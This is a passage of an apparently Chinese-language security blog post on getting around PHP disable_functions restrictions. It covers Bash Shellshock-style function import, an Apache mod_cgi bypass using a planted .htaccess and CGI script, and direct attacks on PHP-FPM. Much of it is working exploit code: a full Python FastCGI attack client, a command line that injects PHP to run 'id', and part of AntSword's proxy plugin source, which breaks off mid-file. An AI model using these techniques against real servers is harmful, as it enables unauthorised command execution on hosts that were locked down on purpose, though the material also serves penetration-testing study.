class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">function ShellShock&#123;<br>   echo hello<br>&#125;<br>hello   #调用这个函数<br></code></pre></div></td></tr></table></figure><p>但是，Bash还有一种使用环境变量来定义函数的方法，这是它的特性。</p><p>如果环境变量的值以字符”() {“开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效.</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">➜  ~ export ShellShock=&quot;() &#123; echo Hello ShellShock; &#125;&quot;<br>➜  ~ ShellShock<br>bash:ShellShock: command not found<br>➜  ~ bash<br>bash-4.1$ ShellShock<br>Hello ShellShock<br>bash-4.1$ <br></code></pre></div></td></tr></table></figure><p>基于此可以构造很多命令，可参考这两篇文章<br><a href="_url">_link</a><a href="https://www.freesion.com/article/28721177955/">https://www.freesion.com/article/28721177955/</a><br><a href="_url">_link</a><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></p><h2 id="Apache-Mod-CGI绕过disable-function"><a href="#Apache-Mod-CGI绕过disable-function" class="headerlink" title="Apache Mod CGI绕过disable function"></a>Apache Mod CGI绕过disable function</h2><blockquote><p>利用条件：启用mod-cgi，允许htaccess文件，.htaccess可写</p></blockquote><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p>apache有一个cgi模块，该模块可以设置指定文件类型以cgi方式让服务器运行，例如一个不存在的afaafa后缀文件，通过设置，就可以当作cgi运行，因为是直接服务器运行的，所以可以绕过php的disable_functions限制。</p><p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</p><p>apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置</p><p>先创建一个.a文件</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">#!/bin/shecho&amp;id<br></code></pre></div></td></tr></table></figure><p>然后再建一个.htaccess文件，内容如下，意思是把.a文件当作cgi执行。</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs txt">OPtions + ExecCGI<br>AddHandler cgi-script .nbcgi-script .a<br></code></pre></div></td></tr></table></figure><h2 id="攻击PHP-FPM绕过disable-function"><a href="#攻击PHP-FPM绕过disable-function" class="headerlink" title="攻击PHP_FPM绕过disable function"></a>攻击PHP_FPM绕过disable function</h2><h4 id="PHP-FPM介绍"><a href="#PHP-FPM介绍" class="headerlink" title="PHP_FPM介绍"></a>PHP_FPM介绍</h4><p>Php-fpm是什么</p><blockquote><p>1、cgi、fast-cgi协议<br>cgi的历史<br>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序</p></blockquote><p>fast-cgi的改进</p><blockquote><p>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p></blockquote><p>于是，出现了cgi的改良版本</p><blockquote><p>fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p></blockquote><p>所以</p><blockquote><p>php-fpm即php-Fastcgi Process Manager.php-fpm是 FastCGI 的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种进程。master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p></blockquote><p>工作流程如图<br><img src="https://img-blog.csdnimg.cn/20210518122607155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="攻击PHP-FPM的原理"><a href="#攻击PHP-FPM的原理" class="headerlink" title="攻击PHP-FPM的原理"></a>攻击PHP-FPM的原理</h4><p>基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。<br><img src="https://img-blog.csdnimg.cn/20210518123521695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>requestId:占俩个字节，一个唯一的标志id，以避免同时处理多个请求时的影响。 </li><li>contentLength:占2个字节，表示body的长度。语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 </li><li>paddingLength:填充长度的值，为了提高处理消息的能力，我们的每个消息大小都必须为8的倍数，此长度标示，我们在消息的尾部填充的长度 </li><li>reserved:保留字段</li></ul><p>贴一下大佬得脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastCGIClient</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 版本号，不重要</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># FastCGI服务器角色及其设置</span><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    <span class="hljs-comment"># # type 记录类型1-11</span><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    <span class="hljs-comment"># 头部长度，默认为8</span><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># 自定义请求状态</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):</span><br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数创建了一个socket，并且去连接(self.host, self.port)</span><br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):</span><br>        <span class="hljs-comment"># 此函数根据fcgi_type对content进行封装</span><br>        length = <span class="hljs-built_in">len</span>(content)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_VERSION) \<br>               + <span class="hljs-built_in">chr</span>(fcgi_type) \<br>               + <span class="hljs-built_in">chr</span>((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + content<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):</span><br>        <span class="hljs-comment"># 此函数对body进行编码</span><br>        nLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(name))<br>        vLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(value))<br>        record = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + <span class="hljs-built_in">str</span>(name) + <span class="hljs-built_in">str</span>(value)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):</span><br>        <span class="hljs-comment"># 此函数对header进行解码</span><br>        <span class="hljs-comment"># 被用于__decodeFastCGIRecord函数的一部分</span><br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIRecord</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数对record进行解码</span><br>        header = self.sock.recv(<span class="hljs-built_in">int</span>(FastCGIClient.__FCGI_HEADER_SIZE))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                buffer = self.sock.recv(contentLength)<br>                <span class="hljs-keyword">while</span> contentLength <span class="hljs-keyword">and</span> buffer:<br>                    contentLength -= <span class="hljs-built_in">len</span>(buffer)<br>                    record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = self.sock.recv(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 区分多段Record.requestId作为同一次请求的标志</span><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 构造header</span><br>        beginFCGIRecordContent = <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>                                 + <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + <span class="hljs-built_in">chr</span>(self.keepalive) \<br>                                 + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br><br>        <span class="hljs-comment"># 构造body</span><br>        paramsRecord = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.iteritems():<br>                <span class="hljs-comment"># paramsRecord = self.__encodeNameValueParams(name, value)</span><br>                <span class="hljs-comment"># request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br>        <span class="hljs-comment"># 发送fast-cgi格式的包</span><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br></code></pre></div></td></tr></table></figure><p>利用</p><blockquote><p>python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c ‘&lt;?php echo <code>id</code>;exit;?&gt;’</p></blockquote><p>也可看看蚁剑插件.antproxy.php的源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=strtolower(preg_replace(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=preg_replace_callback(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=preg_replace(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=str_replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> strtoupper(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=explode(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=parseHeader(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br>set_time_limit(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=get_client_header();<br><span 